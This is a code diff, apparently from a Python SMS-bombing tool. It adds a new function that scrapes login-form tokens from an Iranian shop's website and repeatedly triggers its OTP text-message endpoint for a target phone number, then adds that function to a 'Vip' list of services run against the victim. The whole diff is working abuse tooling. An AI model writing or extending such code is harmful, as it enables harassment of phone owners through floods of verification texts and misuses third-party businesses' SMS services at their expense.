@@ -53,8 +53,99 @@ def check_internet():
 # SMS Service
 # ------------------------------
 
+def ilozi(phone):
+    import requests
+    import re
+    
+    digits_phone = phone.replace("+98", "")
+    
+    try:
+        # ایجاد session برای حفظ cookies
+        session = requests.Session()
+        
+        # دریافت صفحه اصلی برای استخراج مقادیر
+        home_response = session.get("https://ilozi.com/?login=true&page=2", timeout=10, headers={
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+        })
+        
+        # استخراج instance_id از صفحه
+        instance_id = None
+        instance_pattern = r'name="instance_id" value="([a-f0-9]+)"'
+        match = re.search(instance_pattern, home_response.text)
+        if match:
+            instance_id = match.group(1)
+        
+        # استخراج digits_form از صفحه
+        digits_form = None
+        form_pattern = r'name="digits_form" value="([a-f0-9]+)"'
+        match = re.search(form_pattern, home_response.text)
+        if match:
+            digits_form = match.group(1)
+        
+        # اگر پیدا نشد، از مقادیر پیشفرض استفاده کن
+        if not instance_id:
+            instance_id = "6fb17492e0d343df4e533a9deb8ba6b9"
+        if not digits_form:
+            digits_form = "3780032f76"
+        
+        url = "https://ilozi.com/wp-admin/admin-ajax.php"
+        
+        payload = {
+            "login_digt_countrycode": "+98",
+            "digits_phone": digits_phone,
+            "action_type": "phone",
+            "sms_otp": "",
+            "otp_step_1": "1",
+            "digits_otp_field": "1",
+            "digits": "1",
+            "instance_id": instance_id,
+            "action": "digits_forms_ajax",
+            "type": "login",
+            "digits_redirect_page": "https://ilozi.com/my-account/?action=register",
+            "digits_form": digits_form,
+            "_wp_http_referer": "/?login=true&page=2",
+            "show_force_title": "1",
+            "otp_resend": "true",
+            "container": "digits_protected",
+            "sub_action": "sms_otp"
+        }
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://ilozi.com",
+            "Referer": "https://ilozi.com/?login=true&page=2",
+        }
+        
+        response = session.post(url, data=payload, headers=headers, timeout=10)
+        
+        print(f'{g}[+] Status: {response.status_code}{a}')
+        print(f'{g}[+] Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            try:
+                response_data = response.json()
+                if response_data.get("success") is True:
+                    print(f'{g}(ilozi) {a}Code Sent')
+                    return True
+                else:
+                    print(f'{r}[-] (ilozi) Failed: {response_data.get("message", "Unknown error")}{a}')
+                    return False
+            except:
+                if response.text.strip() == "1":
+                    print(f'{g}(ilozi) {a}Code Sent')
+                    return True
+        
+        print(f'{r}[-] (ilozi) HTTP Error: {response.status_code}{a}')
+        return False
+            
+    except Exception as e:
+        print(f'{r}[!] ilozi Exception: {e}{a}')
+        return False
 
-         
+
+
 def vitrin_shop(phone):
     import requests
     import re
@@ -144,7 +235,7 @@ def send_service_safe(service, phone):
         
 def Vip(phone, Time):
     services = [
-    vitrin_shop,  # سرویس جدید
+    vitrin_shop,   ilozi, # سرویس جدید
 ]
     total_services = len(services)
 
